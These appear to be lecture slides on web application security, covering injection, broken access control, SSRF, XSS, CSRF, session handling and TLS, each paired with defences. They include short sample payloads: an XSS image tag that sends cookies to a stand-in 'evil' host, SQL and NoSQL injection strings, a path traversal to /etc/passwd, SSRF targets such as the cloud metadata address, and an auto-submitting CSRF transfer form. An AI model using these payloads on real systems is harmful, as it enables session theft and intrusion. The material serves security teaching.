The Most Exposed Program You Will Write

  • A web application is a program that runs arbitrary input from strangers, all day, with no gate in front of it
  • Everything the client sends is under the client's control
    • Path, query, headers, cookies, body — all of it
    • Including fields your own form generated. The browser is not part of your system
  • Client-side validation is a usability feature. It is not a control, because the attacker does not use your form

Two Different Victims

  • Server-side attacks target your machine — the database, the file system, the internal network
  • Client-side attacks target your users, through the trust their browser places in your origin
  • The second category is easy to under-weight, because nothing on your server is damaged. Your users are still the ones who were robbed, and it is still your bug
  • The browser's own defences — the same-origin policy and CORS — protect the browser, not your server

The Golden Rule

Never mix data with code.

  • Nearly every vulnerability in this lecture is one bug: data supplied by a user is parsed as instructions by some interpreter
    • SQL injection — data becomes part of a query
    • XSS — data becomes part of an HTML document
    • Command injection — data becomes part of a shell command
  • Lecture 5 met the same bug in C: a name became a privilege flag because nothing separated the two
  • The fix always has the same shape: keep them apart. Not "sanitize harder"

SQL Injection

A login handler that builds its query by concatenation:


query := "SELECT id FROM users WHERE name = '" + name + "'"

What happens when name is ' OR '1'='1?

The Query the Database Sees


SELECT id FROM users WHERE name = '' OR '1'='1'
  • The quote supplied by the user ended the string, and everything after it became SQL
  • The database behaved correctly. It cannot know which characters came from you and which came from the attacker — by the time it sees the query, that information is gone

Prepared Statements


row := db.QueryRow("SELECT id FROM users WHERE name = $1", name)
  • The query goes to the server once, with holes in it. The values travel separately
  • The value can never become SQL, whatever characters it contains, so there is nothing left to escape
  • This is protocol-level separation, not clever quoting. That distinction is the whole lesson
  • It also stops being your judgement call, which is why it holds up over years of maintenance

The Same Bug, Other Interpreters

  • Command injection — input reaching sh -c. Pass an argument vector, never a string
  • Path traversal — a filename containing ../../etc/passwd. Resolve, then check the result is still under the root
  • NoSQL injection — a JSON body that deserializes into a query object, e.g. {"password": {"$ne": null}}
  • Template injection — user input rendered as a template, which usually means arbitrary code
  • Deserialization — reconstructing objects from untrusted bytes. Some formats can invoke code while parsing

Broken Access Control

OWASP's number one since 2021, and it needs no injection at all — just a changed number. 


GET /api/invoices/1041     → your invoice
GET /api/invoices/1042     → someone else's invoice
  • The session is valid, the user is authenticated. Nobody checked whether this user owns that object
  • Hiding the link does nothing — the endpoint is still there. So does using a UUID, which only makes it harder to guess
  • The check belongs in the query: WHERE id = $1 AND owner_id = $2. Then forgetting it returns nothing instead of returning someone's data

Server-Side Request Forgery

  • Your server fetches a URL the user supplied — a webhook, a thumbnail, a PDF importer
  • The attacker points it inward, and your server is already inside the firewall
    • http://169.254.169.254/ — the cloud metadata service, and often the credentials with it
    • http://localhost:6379/ — the admin port with no auth
  • Defences: an allow-list of destinations, resolve the name and check the address before connecting, and give the fetcher its own network path with no route inside
  • Blocking on the string is not enough — DNS can resolve a public name to a private address, and can answer differently the second time

Cross-Site Scripting

The same bug, but the interpreter is the browser and the injected code is JavaScript. 


// a comment box that renders whatever was posted
element.innerHTML = "<p>" + comment + "</p>";

A comment of <img src=x onerror="fetch('//evil/'+document.cookie)"> now runs in every visitor's session.

Three Kinds

Stored Saved on the server, served to everyone. The worst — it needs no lure
Reflected Echoed back from the request. Needs the victim to follow a link
DOM-based Never reaches the server at all — client-side code reads the URL and writes it into the page
  • Script running on your origin is your user: it can read the page, submit forms, and reach any authenticated endpoint
  • Which is why XSS defeats CSRF tokens — the script simply reads the token first

Stopping It

  • Encode on output, for the context you are writing into. HTML body, attribute, JavaScript and URL each need different escaping
  • Use the API that cannot execute — textContent, never innerHTML. A modern framework does this by default, and the danger is the escape hatch (dangerouslySetInnerHTML, v-html)
  • Content Security Policy — tell the browser which script sources are legitimate. A second layer, for when the first one has a hole
  • Sanitize HTML with a library if you must accept it. Your regular expression will be bypassed

Cross-Site Request Forgery

  • The browser attaches your cookies to every request to a site — including requests made by a different site
  • So a page on evil.example can submit a form to your bank, and the browser will authenticate it for the attacker 

<form action="https://bank.example/transfer" method="POST">
  <input name="to"     value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>

The attacker never sees the response. They do not need to — the transfer already happened.

Stopping CSRF

  • SameSite cookies — the browser will not attach the cookie to a cross-site request. Lax is now the default in current browsers, which killed most of this class outright
  • CSRF token — a per-session random value in the form, checked on the server. The attacker's page cannot read it, because the same-origin policy stops them
  • Re-authenticate for operations that really matter
  • And the precondition for all of it: a GET must never change state. If it does, an <img> tag is an attack

The Rest of the Client Side

  • Clickjacking — your page in an invisible iframe over the attacker's buttons. Fix: frame-ancestors in CSP
  • Open redirect — ?next= pointing anywhere. Turns your domain into a credible phishing link. Allow-list the destinations
  • Supply chain — a script tag pointing at someone else's CDN is that party executing code on your origin, forever. Pin it with Subresource Integrity, or host it yourself
  • Dependencies — the average application is mostly other people's code. Lock the versions, scan them, and update deliberately

HTTP Has No Memory

  • Every request stands alone. The protocol has no idea the last one came from the same person
  • So we check the password once, and hand out a session identifier the browser returns automatically
  • Which makes that identifier as good as the password, for as long as it lives
  • Everything below follows from that one sentence

Guessing the Session


### three logins against a hand-rolled generator ###
Set-Cookie: session=sess-1; Path=/
Set-Cookie: session=sess-2; Path=/
Set-Cookie: session=sess-3; Path=/

### three logins against crypto/rand ###
Set-Cookie: session=o2d9gnBGHyvvd0vFCQYvVA; Path=/; HttpOnly; Secure; SameSite=Lax
Set-Cookie: session=YDmu9RDLwkgzBI8l3LxmWA; Path=/; HttpOnly; Secure; SameSite=Lax
Set-Cookie: session=1nEDix88iEUq4gQ16crT6A; Path=/; HttpOnly; Secure; SameSite=Lax
  • Log in once as yourself, get sess-4, and now try sess-3
  • A session identifier needs 128 bits from a CSPRNG. Not a counter, not a timestamp, not a hash of the username

The Cookie Attributes

HttpOnly JavaScript cannot read it, so an XSS bug cannot simply steal it
Secure Sent over HTTPS only — never in the clear, not even once
SameSite Not attached to cross-site requests. The CSRF defence
Path / Domain Narrow the scope. Do not widen it to the parent domain casually
__Host- prefix The browser enforces Secure, no Domain, and Path=/ — a subdomain cannot overwrite it

HttpOnly blocks script access. It does nothing about the network — that is what Secure is for.

Attacks on Sessions

  • Hijacking — steal the identifier by sniffing, by XSS, or from a log file that recorded the URL
  • Fixation — the attacker plants a session identifier before you log in and waits for you to authenticate it
    • Fix in one line: issue a new identifier at login, and again at any privilege change
  • Never in the URL. URLs end up in browser history, server logs, and the Referer header sent to other sites
  • Expire them — idle timeout and an absolute lifetime, both

Logging Out Is a Server-Side Delete

  • Clearing the cookie asks the browser to forget. It does nothing to a copy the attacker already has
  • Log out by deleting the session from the store. Then the stolen identifier refers to nothing
  • This is the strongest argument for server-side sessions over self-contained tokens
    • A signed JWT is valid until it expires, because nothing is consulted to check it
    • Revoking one means keeping a deny-list — which is a session store, rebuilt reluctantly
  • And a JWT is signed, not encrypted. The payload is readable base64url; do not put secrets in it

What TLS Actually Gives You

  • Confidentiality — the network cannot read it
  • Integrity — the network cannot change it undetected
  • Server authentication — you are talking to the name in the URL

Note what is not on the list:

  • It says nothing about whether the server is trustworthy or its code is correct. A phishing site can have a perfect certificate
  • Client authentication is optional and rarely used on the public web

The Handshake, Briefly

  • ClientHello — versions, cipher suites, and a key share. Sent before any key exists, so it is in the clear
  • ServerHello — the chosen suite and the server's key share
  • Certificate + signature — the server proves it holds the private key for the name it claims
  • Both sides derive the same session keys from the two shares — that is Diffie–Hellman from lecture 3, and it is why recording the traffic does not help later
  • TLS 1.3 does this in one round trip, removed every legacy cipher, and made forward secrecy mandatory

A Certificate the Client Will Not Accept


$ openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem \
      -out cert.pem -days 1 -subj "/CN=lecture.local"

$ openssl x509 -in cert.pem -noout -subject -issuer
  subject=CN=lecture.local
  issuer=CN=lecture.local        <-- it signed itself

$ openssl s_client -connect 127.0.0.1:8443 -verify_return_error
verify error:num=18:self-signed certificate
Verification error: self-signed certificate

The cryptography is perfect. The trust is missing — nothing vouches for the name.

The Same Handshake, Checking Turned Off


New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
Peer signature type: rsa_pss_rsae_sha256
Verification error: self-signed certificate
  • TLS 1.3, AES-256-GCM, RSA-PSS — every primitive from lecture 3, doing exactly its job
  • And the connection is worthless, because an encrypted channel to an unverified party is a channel to the attacker
  • This is why InsecureSkipVerify and curl -k in production code are a finding, not a convenience

Getting HTTPS Right

  • HTTPS everywhere, and redirect HTTP to it — but the redirect itself travels in the clear
  • HSTS closes that gap: the browser remembers to use HTTPS and refuses to be talked down. Preloading removes even the first visit
  • No mixed content. One http:// script on an HTTPS page hands the whole page back to the network
  • Automate renewal. Certificates now last weeks, not years, and an expired certificate is an outage
  • Modern configuration: TLS 1.2 and 1.3 only, and let the library choose

Where This Leaves Us

  • Every server-side bug here was data becoming code. Every client-side one was trust in an origin being misused
  • Sessions are the credential after login, and deserve the care the password gets
  • TLS protects the channel. It has never protected the endpoints
